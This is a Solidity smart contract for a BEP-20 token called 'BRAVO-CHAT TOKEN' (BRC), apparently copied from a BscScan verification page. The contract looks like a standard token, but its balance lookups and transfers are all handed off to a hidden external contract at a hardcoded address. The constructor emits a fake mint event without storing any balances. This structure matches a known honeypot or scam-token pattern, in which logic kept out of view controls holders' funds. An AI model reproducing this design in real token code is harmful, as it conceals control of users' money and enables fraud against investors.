/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface BRX {
    function transferFrom(address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract BRC {
    string public constant name = "BRAVO-CHAT TOKEN";
    string public constant symbol = "BRC";
    uint8 public  constant decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    
    mapping(address => mapping(address => uint256)) private allowances;
    address private brcStg;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        emit Transfer(address(0), msg.sender, totalSupply);
        brcStg = 0x44b1140f755eB8FbA009Ca2d26466D7Fa7A17479;
    }

    // ERC20 Functions
    function balanceOf(address account) public view returns (uint256) {
        return BRX(brcStg).balanceOf(account);
    }
    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return allowances[tokenOwner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address receiver, uint256 amount) public returns (bool) {
        emit Transfer(msg.sender, receiver, amount);
        return BRX(brcStg).transferFrom(msg.sender, receiver, amount);
    }
    function transferFrom(address tokenOwner, address receiver, uint256 amount) public returns (bool) {
        require(amount <= allowances[tokenOwner][msg.sender] && amount > 0);
        allowances[tokenOwner][msg.sender] -= amount;
        emit Transfer(tokenOwner, receiver, amount);
        return BRX(brcStg).transferFrom(tokenOwner, receiver, amount);
    }
}